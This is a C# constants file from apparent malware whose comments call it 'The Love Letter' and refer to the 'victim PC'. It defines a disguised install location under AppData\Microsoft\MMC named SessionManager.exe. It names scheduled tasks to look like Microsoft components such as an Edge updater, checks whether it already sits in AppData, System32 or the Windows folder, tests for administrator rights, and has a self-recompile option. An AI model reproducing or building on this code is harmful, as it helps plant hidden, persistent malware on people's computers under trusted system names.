using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace Client
{
    /// <summary>
    /// Constants not belonging to any class.
    /// </summary>
    public static class Constants
    {

        public static float Version = 8.1f;

        //----------- Editable

        public static bool RecompileSelfEveryStart = false;

        //-----------

        public static Random Rand = new Random(DateTime.Now.Second);

        public static string Title = Assembly.GetExecutingAssembly().GetCustomAttribute<AssemblyTitleAttribute>().Title;

        public static string AppDataFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        public static string MMCFolder = System.IO.Path.GetFullPath(AppDataFolder + @"\Microsoft\MMC");

        /// <summary>
        /// Target location to victim PC
        /// </summary>
        public static string MMCFile = System.IO.Path.GetFullPath(MMCFolder + @"\SessionManager.exe");
        public static string MMCTaskName = "Session Manager";

        /// <summary>
        /// The System32 directory
        /// </summary>
        public static string System32Dir = Environment.SystemDirectory;
        /// <summary>
        /// The Windows directory at C:/Windows
        /// </summary>
        public static string WinDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);

        public static string WinDirTaskName = "MicrosoftEdgeUpdateW-02";

        public static string MyPath = Assembly.GetExecutingAssembly().Location;

        public static string MyName = Path.GetFileNameWithoutExtension(MyPath);

        public static byte[] MyBytes = File.ReadAllBytes(Assembly.GetExecutingAssembly().Location);
        /// <summary>
        /// Checks if the current program is already in the victim's PC via path.
        /// </summary>
        public static bool IsInAppData()
        {
            return Utilities.Files_And_Pathing.NormalizePath(MyPath).ToLower().Contains(MMCFolder.ToLower());
        }
        public static bool IsInSys32() {
            return Utilities.Files_And_Pathing.NormalizePath(MyPath).ToLower().Contains(Environment.SystemDirectory.ToLower());
        }
        public static bool IsInWinDir()
        {
            return Utilities.Files_And_Pathing.NormalizePath(MyPath).ToLower().Contains(WinDir.ToLower());
        }

        public static int MyProcessID = Process.GetCurrentProcess().Id;

        /// <summary>
        /// Checks if The Love Letter is running as administrator because if it does...things will get really interesting.
        /// </summary>
        public static bool IsAdmin()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}
